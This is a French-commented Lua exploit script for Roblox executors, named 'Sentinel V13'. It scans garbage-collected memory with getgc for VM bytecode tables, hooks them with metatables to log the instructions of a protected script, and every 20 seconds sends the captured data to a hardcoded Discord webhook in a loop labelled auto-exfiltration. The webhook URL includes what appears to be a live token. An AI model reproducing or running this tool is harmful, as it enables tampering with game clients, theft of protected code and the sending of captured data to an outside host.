local HttpService = game:GetService("HttpService")
local WebhookURL = "https://discord.com/api/webhooks/1485392452088103153/BIiOu2r4bO5zKh40r93EG-aWfIOqOrumbgcj0-mhvh0apDLLjN_X0DZ1HuWkvSWOu2cb"

local Engine = {
    Queue = {},
    LastPC = -1,
    IsCapturing = false,
    CapturedCount = 0
}

print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("📱 SENTINEL V13 : MOBILE EDITION")
print("🚀 MODE : AUTO-CHUNKING WEBHOOK")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

-- // 1. FONCTION D'ENVOI SIMPLE (COMPATIBLE MOBILE)
local function Send(text)
    local data = {
        ["content"] = "```lua\n" .. text .. "\n```",
        ["username"] = "SENTINEL_MOBILE_V13"
    }
    pcall(function()
        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data))
    end)
end

-- // 2. SCANNER DE MÉMOIRE (TROUVE LE SCRIPT IB)
local function StartCapture()
    for _, v in pairs(getgc(true)) do
        if type(v) == "table" and #v > 300 then
            local isBytecode = true
            for i = 1, 5 do if type(v[i]) ~= "number" then isBytecode = false end end
            
            if isBytecode and not getmetatable(v) then
                local backup = {}
                for k, val in pairs(v) do backup[k] = val; v[k] = nil end
                
                setmetatable(v, {
                    __index = function(_, key)
                        local op = backup[key]
                        if type(key) == "number" and key ~= Engine.LastPC then
                            table.insert(Engine.Queue, "PC[" .. key .. "] -> OP[" .. tostring(op) .. "]")
                            Engine.LastPC = key
                            Engine.CapturedCount = Engine.CapturedCount + 1
                        end
                        return op
                    end
                })
                Engine.IsCapturing = true
                print("✅ VM Capturée ! Données en cours de stockage...")
                return true
            end
        end
    end
end

-- // 3. BOUCLE AUTO-EXFIL (S'ACTIVE TOUTES LES 20 SECONDES)
task.spawn(function()
    while true do
        task.wait(20) -- Attend 20 secondes entre chaque envoi
        
        if #Engine.Queue > 0 then
            print("📡 Tentative d'envoi de " .. #Engine.Queue .. " instructions...")
            
            -- On prépare un bloc de texte (max 1800 chars pour Discord)
            local currentBlock = "-- [ SENTINEL DATA DUMP ] --\n"
            local processedIndices = {}
            
            for i, line in ipairs(Engine.Queue) do
                if #currentBlock + #line < 1850 then
                    currentBlock = currentBlock .. line .. "\n"
                    table.insert(processedIndices, i)
                else
                    break
                end
            end
            
            -- Envoi du bloc
            Send(currentBlock)
            
            -- On vide ce qu'on a envoyé de la file d'attente
            for i = #processedIndices, 1, -1 do
                table.remove(Engine.Queue, processedIndices[i])
            end
            
            print("✅ Bloc envoyé. Reste en file : " .. #Engine.Queue)
        end
    end
end)

-- LANCEMENT AUTOMATIQUE
task.spawn(function()
    print("🔍 Recherche de la VM...")
    while not Engine.IsCapturing do
        StartCapture()
        task.wait(2)
    end
end)
